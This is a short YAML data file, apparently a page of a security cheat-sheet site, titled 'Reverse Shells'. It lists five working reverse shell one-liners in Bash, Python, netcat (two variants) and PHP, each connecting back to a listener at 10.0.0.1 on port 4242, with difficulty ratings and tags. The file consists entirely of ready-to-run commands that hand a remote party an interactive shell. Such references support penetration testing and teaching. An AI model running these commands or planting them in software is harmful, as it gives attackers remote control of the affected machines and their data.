---
title: "Reverse Shells"
id: "shells"
icon: "material-symbols:terminal-rounded"
commands:
  - cmd: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
    desc: "Bash TCP Reverse Shell"
    difficulty: "Easy"
    tags: ["linux", "bash", "network"]

  - cmd: 'python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''
    desc: "Python3 Reverse Shell"
    difficulty: "Medium"
    tags: ["scripting", "python", "linux"]

  - cmd: "nc -e /bin/sh 10.0.0.1 4242"
    desc: "Netcat Traditional"
    difficulty: "Easy"
    tags: ["netcat", "linux", "backdoor"]

  - cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f"
    desc: "Netcat OpenBSD (No -e)"
    difficulty: "Medium"
    tags: ["netcat", "fifo", "linux"]

  - cmd: 'php -r ''$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'''
    desc: "PHP Reverse Shell"
    difficulty: "Medium"
    tags: ["web", "php"]
---

